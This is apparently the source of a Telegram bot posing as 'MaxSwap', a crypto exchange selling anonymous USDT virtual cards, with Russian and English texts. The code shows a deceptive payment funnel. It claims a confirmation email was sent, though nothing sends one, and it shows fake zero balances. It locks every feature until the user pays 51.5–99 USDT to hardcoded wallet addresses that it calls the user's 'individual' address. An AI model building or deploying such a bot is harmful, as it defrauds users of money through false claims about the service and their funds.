const TelegramBot = require('node-telegram-bot-api');

const TOKEN = process.env.BOT_TOKEN;
const MINI_APP_URL = 'https://huntersnetplus.github.io/MaxSwap/';
const QR_URL = 'https://raw.githubusercontent.com/ivanfj633kfdodfd-cmyk/MSSBot/main/QR.jpg';

if (!TOKEN) console.error('❌ BOT_TOKEN is not set!');

const users = {};
const bot = new TelegramBot(TOKEN);

// ─── Helpers ──────────────────────────────────────────────────────────────────
function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
}

function formatDate(date) {
  return new Date(date).toLocaleDateString('ru-RU', {
    day: '2-digit', month: '2-digit', year: 'numeric'
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function editOrSend(chatId, msgId, text, opts = {}) {
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: 'Markdown',
      ...opts
    });
    return msgId;
  } catch (e) {
    const sent = await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', ...opts });
    return sent.message_id;
  }
}

// ─── Texts ────────────────────────────────────────────────────────────────────
const T = {
  ru: {
    chooseLanguage: '🌐 Выберите язык интерфейса:',
    enterEmail: '📧 Введите ваш адрес электронной почты:',
    invalidEmail: '❌ Некорректный адрес электронной почты. Пожалуйста, введите действительный e-mail:',
    emailSent: (email) =>
      `📨 На адрес электронной почты *${email}* отправлено письмо для подтверждения.\n\nВы можете подтвердить почту в любой удобный момент — тогда она станет дополнительным каналом связи.\n\nЕсли вы не получили письмо и/или истёк срок действия ссылки — проверьте папку «Спам».`,
    profile: (id, date) =>
      `👤 *Профиль*\n\n🆔 ID аккаунта: \`${id}\`\n📅 Дата создания: ${date}\n\n💼 *Доступные балансы:*\nUSDT: 0.00\nUSDC: 0.00\nBTC: 0.0\nETH: 0.0\nXRP: 0.0\nLTC: 0.0\nTRX: 0.0\nXLM: 0.0\nBNB: 0.0\nBCH: 0.0\nHBAR: 0.0\nDOT: 0.0\nAVAX: 0.0\nALGO: 0.0\nDOGE: 0.0\nPOL: 0.0\nTRUMP: 0.0\nNEAR: 0.0\nTON: 0.0\nADA: 0.0\nSOL: 0.0`,
    needCard: '🔒 Для доступа к этому разделу нужно открыть Max Swap Карту.',
    openCardBtn: '💳 Открыть в приложении',
    openTgBtn: '📲 Открыть в Telegram',
    cardInfo:
      `🪙 Виртуальная карта за 5 минут — легко, безопасно, надёжно.\n\n💳 Получите мгновенно, оплачивайте в 1000+ онлайн-сервисах через ApplePay.\n\n✅ Баланс в USDT, полная анонимность, абсолютная безопасность без необходимости верификации.\n\n🔒 Ваша конфиденциальность гарантирована.\n\n♻️ Отслеживайте расходы прямо в Telegram. Мгновенная выдача — используйте сразу после пополнения.\n\nВыпуск карты: 25 USDT\nПервый депозит: минимум 25 USDT\nКомиссия за пополнение: 3%`,
    proceedBtn: '✅ Перейти к оформлению',
    chooseCardText:
      `💳 *Выберите тип карты:*\n\n` +
      `1️⃣ *MaxSwap Online Card* — 52.5 USDT\n` +
      `Подойдёт для покупок в интернете, подписок, оплаты онлайн-сервисов (Netflix, ChatGPT, Spotify и тд.)\n\n` +
      `2️⃣ *MaxSwap NFC Card* — 52.5 USDT\n` +
      `Подойдёт для привязки к Google Pay | Apple Pay и оплаты через NFC-терминалы.\n\n` +
      `3️⃣ *MaxSwap Ultima* — 99 USDT\n` +
      `Комбинация двух предыдущих пунктов. Карта подойдёт для любых целей.`,
    cardOnlineBtn: '💻 MaxSwap Online Card — 52.5 USDT',
    cardNfcBtn:    '📱 MaxSwap NFC Card — 52.5 USDT',
    cardUltimaBtn: '⭐ MaxSwap Ultima — 99 USDT',
    cardPaymentCaption:
      `✅ Для открытия карты отправьте не менее 51,5 USDT по адресу:\n\n` +
      `\`TVis1d6QARhWBQ6XZmisD2oSWGnqFM2qzX\`\n\n` +
      `🔐 Это ваш индивидуальный TRC-20 адрес, который доступен для пополнения в любое время.\n\n` +
      `♻️ Средства будут зачислены на баланс автоматически после подтверждения сети.\n\n` +
      `🟣 Адрес USDT в сети ETH:\n\n` +
      `\`0xaacE295640C15344C6a2DC934a3AACcD4e23cc20\`\n\n` +
      `🔧 Для оплаты другой валютой откройте web-приложение Max Swap.`,
    sbpBtn: '✅ Оплата по СБП через QR-код (без комиссии)',
    cardPayBtn: '💳 Оплата с карты (без комиссии)',
    webAppBtn: '🌐 Web-приложение',
    supportBtn: '🆘 Поддержка',
    openCardMenuBtn: '💳 Открыть MaxSwap Карту',
    walletBtn: '💰 Кошелёк',
    exchangeBtn: '🔄 Обмен',
    buyBtn: '💵 Купить',
    sellBtn: '📤 Продать',
    limitBtn: '📋 Лимитные ордера',
    amlBtn: '🔐 AML',
    settingsBtn: '⚙️ Настройки',
    infoBtn: '📄 Инфо',
  },
  en: {
    chooseLanguage: '🌐 Choose your interface language:',
    enterEmail: '📧 Enter your email address:',
    invalidEmail: '❌ Invalid email address. Please enter a valid e-mail:',
    emailSent: (email) =>
      `📨 A confirmation email has been sent to *${email}*.\n\nYou can confirm your email at any convenient time — it will then become an additional communication channel.\n\nIf you did not receive the confirmation email and/or the link has expired — please check your Spam folder.`,
    profile: (id, date) =>
      `👤 *Profile*\n\n🆔 Account ID: \`${id}\`\n📅 Created: ${date}\n\n💼 *Available balances:*\nUSDT: 0.00\nUSDC: 0.00\nBTC: 0.0\nETH: 0.0\nXRP: 0.0\nLTC: 0.0\nTRX: 0.0\nXLM: 0.0\nBNB: 0.0\nBCH: 0.0\nHBAR: 0.0\nDOT: 0.0\nAVAX: 0.0\nALGO: 0.0\nDOGE: 0.0\nPOL: 0.0\nTRUMP: 0.0\nNEAR: 0.0\nTON: 0.0\nADA: 0.0\nSOL: 0.0`,
    needCard: '🔒 To access this section you need to open a Max Swap Card.',
    openCardBtn: '💳 Open in App',
    openTgBtn: '📲 Open in Telegram',
    cardInfo:
      `🪙 Virtual card in 5 minutes — easy, secure, reliable.\n\n💳 Get it instantly, pay at 1000+ online services via ApplePay.\n\n✅ USDT balance, full anonymity, absolute security without verification.\n\n🔒 Your privacy is guaranteed.\n\n♻️ Track expenses directly in Telegram. Instant issuance — use immediately after top-up.\n\nCard issuance: 25 USDT\nFirst deposit: minimum 25 USDT\nTop-up fee: 3%`,
    proceedBtn: '✅ Proceed to checkout',
    chooseCardText:
      `💳 *Choose your card type:*\n\n` +
      `1️⃣ *MaxSwap Online Card* — 52.5 USDT\n` +
      `Perfect for online shopping, subscriptions, and online services (Netflix, ChatGPT, Spotify, etc.)\n\n` +
      `2️⃣ *MaxSwap NFC Card* — 52.5 USDT\n` +
      `Perfect for linking to Google Pay | Apple Pay and paying via NFC terminals.\n\n` +
      `3️⃣ *MaxSwap Ultima* — 99 USDT\n` +
      `A combination of both previous options. Suitable for any purpose.`,
    cardOnlineBtn: '💻 MaxSwap Online Card — 52.5 USDT',
    cardNfcBtn:    '📱 MaxSwap NFC Card — 52.5 USDT',
    cardUltimaBtn: '⭐ MaxSwap Ultima — 99 USDT',
    cardPaymentCaption:
      `✅ To open the card, send at least 51.5 USDT to:\n\n` +
      `\`TVis1d6QARhWBQ6XZmisD2oSWGnqFM2qzX\`\n\n` +
      `🔐 This is your individual TRC-20 address, available for top-up at any time.\n\n` +
      `♻️ Funds will be credited automatically after network confirmation.\n\n` +
      `🟣 USDT address on ETH network:\n\n` +
      `\`0xaacE295640C15344C6a2DC934a3AACcD4e23cc20\`\n\n` +
      `🔧 To pay with another currency, open the Max Swap web app.`,
    sbpBtn: '💱 Pay with another crypto',
    cardPayBtn: '💳 Pay by card (no fee)',
    webAppBtn: '🌐 Web App',
    supportBtn: '🆘 Support',
    openCardMenuBtn: '💳 Open MaxSwap Card',
    walletBtn: '💰 Wallet',
    exchangeBtn: '🔄 Exchange',
    buyBtn: '💵 Buy',
    sellBtn: '📤 Sell',
    limitBtn: '📋 Limit Orders',
    amlBtn: '🔐 AML',
    settingsBtn: '⚙️ Settings',
    infoBtn: '📄 Info',
  }
};

// ─── Keyboards ────────────────────────────────────────────────────────────────
// Telegram поддерживает цвета кнопок только через web_app и url.
// Для callback кнопок цвет задаётся эмодзи в тексте.
// Зелёный = ✅, Синий = 🌐, Красный = 🆘

function langKeyboard() {
  return {
    inline_keyboard: [[
      { text: '🇷🇺 Русский', callback_data: 'lang_ru' },
      { text: '🇬🇧 English', callback_data: 'lang_en' }
    ]]
  };
}

function profileKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      [{ text: t.openCardMenuBtn, callback_data: 'open_card' }],
      [
        { text: t.walletBtn,   callback_data: 'locked' },
        { text: t.exchangeBtn, callback_data: 'locked' }
      ],
      [
        { text: t.buyBtn,  callback_data: 'locked' },
        { text: t.sellBtn, callback_data: 'locked' }
      ],
      [
        { text: t.limitBtn, callback_data: 'locked' },
        { text: t.amlBtn,   callback_data: 'locked' }
      ],
      [
        { text: t.settingsBtn, callback_data: 'locked' },
        { text: t.infoBtn,     callback_data: 'locked' }
      ],
      [{ text: t.supportBtn, url: 'https://t.me/MaxSwapSupport' }]
    ]
  };
}

function needCardKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      [{ text: t.openCardBtn, web_app: { url: MINI_APP_URL } }],
      [{ text: t.openTgBtn,   callback_data: 'open_card' }]
    ]
  };
}

function cardInfoKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      [{ text: t.proceedBtn, callback_data: 'choose_card' }]
    ]
  };
}

function chooseCardKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      [{ text: t.cardOnlineBtn, callback_data: 'card_online' }],
      [{ text: t.cardNfcBtn,    callback_data: 'card_nfc'    }],
      [{ text: t.cardUltimaBtn, callback_data: 'card_ultima' }]
    ]
  };
}

function cardPaymentKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      // Зелёные — оплата
      [{ text: t.sbpBtn,     url: 'https://t.me/MaxSwapSupport', style: 'success' }],
      [{ text: t.cardPayBtn, url: 'https://t.me/MaxSwapSupport', style: 'success' }],
      // Синяя — web app, Красная — поддержка
      [
        { text: t.webAppBtn,  web_app: { url: MINI_APP_URL },          style: 'primary' },
        { text: t.supportBtn, url: 'https://t.me/MaxSwapSupport',      style: 'danger'  }
      ]
    ]
  };
}

// ─── Отправка шага с оплатой (фото + caption) ─────────────────────────────────
async function sendCardPayment(chatId, lang, prevMsgId) {
  const t = T[lang];
  // Удаляем предыдущее сообщение
  if (prevMsgId) {
    try { await bot.deleteMessage(chatId, prevMsgId); } catch(e) {}
  }
  const sent = await bot.sendPhoto(chatId, QR_URL, {
    caption: t.cardPaymentCaption,
    parse_mode: 'Markdown',
    reply_markup: cardPaymentKeyboard(lang)
  });
  return sent.message_id;
}

// ─── Update handler ───────────────────────────────────────────────────────────
async function handleUpdate(update) {

  // ── Callback query ──
  if (update.callback_query) {
    const query  = update.callback_query;
    const userId = query.from.id;
    const msgId  = query.message.message_id;
    const data   = query.data;
    const state  = users[userId] || {};
    const lang   = state.lang || 'ru';
    const t      = T[lang];

    await bot.answerCallbackQuery(query.id);

    if (data === 'lang_ru' || data === 'lang_en') {
      const chosen = data === 'lang_ru' ? 'ru' : 'en';
      if (!users[userId]) users[userId] = { registeredAt: Date.now() };
      users[userId].lang = chosen;
      users[userId].step = 'enter_email';
      users[userId].lastMsgId = msgId;
      await editOrSend(userId, msgId, T[chosen].enterEmail);
      return;
    }

    if (data === 'locked') {
      await editOrSend(userId, msgId, t.needCard, { reply_markup: needCardKeyboard(lang) });
      return;
    }

    if (data === 'open_card') {
      const newId = await editOrSend(userId, msgId, t.cardInfo, { reply_markup: cardInfoKeyboard(lang) });
      users[userId].lastMsgId = newId;
      return;
    }

    if (data === 'card_payment') {
      const newId = await sendCardPayment(userId, lang, msgId);
      if (users[userId]) users[userId].lastMsgId = newId;
      return;
    }

    if (data === 'choose_card') {
      const newId = await editOrSend(userId, msgId, t.chooseCardText, {
        reply_markup: chooseCardKeyboard(lang)
      });
      if (users[userId]) users[userId].lastMsgId = newId;
      return;
    }

    if (data === 'card_online' || data === 'card_nfc' || data === 'card_ultima') {
      const cardMap = {
        card_online: 'MaxSwap Online Card',
        card_nfc:    'MaxSwap NFC Card',
        card_ultima: 'MaxSwap Ultima'
      };
      if (users[userId]) users[userId].selectedCard = cardMap[data];
      const newId = await sendCardPayment(userId, lang, msgId);
      if (users[userId]) users[userId].lastMsgId = newId;
      return;
    }
  }

  // ── Message ──
  if (update.message) {
    const msg    = update.message;
    const userId = msg.from.id;
    const text   = msg.text || '';

    if (text === '/start') {
      // Если пользователь уже прошёл онбординг — сразу показываем профиль
      const existing = users[userId];
      if (existing && existing.step === 'done') {
        try { await bot.deleteMessage(userId, msg.message_id); } catch(e) {}
        const regDate = formatDate(existing.registeredAt);
        const lang = existing.lang || 'ru';
        const t = T[lang];
        const sent = await bot.sendMessage(userId, t.profile(userId, regDate), {
          parse_mode: 'Markdown',
          reply_markup: profileKeyboard(lang)
        });
        users[userId].lastMsgId = sent.message_id;
        return;
      }

      // Новый пользователь — начинаем онбординг
      users[userId] = { step: 'choose_lang', lang: null, email: null, registeredAt: Date.now() };
      try { await bot.deleteMessage(userId, msg.message_id); } catch(e) {}
      const sent = await bot.sendMessage(userId, T.ru.chooseLanguage, { reply_markup: langKeyboard() });
      users[userId].lastMsgId = sent.message_id;
      return;
    }

    const state = users[userId];
    if (!state || state.step !== 'enter_email') return;

    const lang = state.lang || 'ru';
    const t    = T[lang];

    // Удаляем сообщение пользователя
    try { await bot.deleteMessage(userId, msg.message_id); } catch(e) {}

    if (!isValidEmail(text)) {
      await editOrSend(userId, state.lastMsgId, t.invalidEmail);
      return;
    }

    users[userId].email = text.trim();
    users[userId].step  = 'done';

    // Шаг 1: сообщение о письме
    const emailMsgId = await editOrSend(userId, state.lastMsgId, t.emailSent(text.trim()));
    users[userId].lastMsgId = emailMsgId;

    // Шаг 2: через 2 сек — профиль
    await sleep(2000);

    const regDate = formatDate(state.registeredAt);
    const profileMsgId = await editOrSend(userId, emailMsgId, t.profile(userId, regDate), {
      reply_markup: profileKeyboard(lang)
    });
    users[userId].lastMsgId = profileMsgId;
  }
}

// ─── Vercel serverless handler ────────────────────────────────────────────────
module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.status(200).send('MaxSwap Bot webhook is alive.');
    return;
  }

  let update = req.body;
  if (typeof update === 'string') {
    try { update = JSON.parse(update); } catch (e) {
      res.status(200).json({ ok: false, error: 'bad json' });
      return;
    }
  }

  if (!update) {
    res.status(200).json({ ok: false, error: 'empty body' });
    return;
  }

  console.log('Update:', JSON.stringify(update).slice(0, 200));

  try {
    await handleUpdate(update);
  } catch (err) {
    console.error('Error:', err.message);
  }

  res.status(200).json({ ok: true });
};
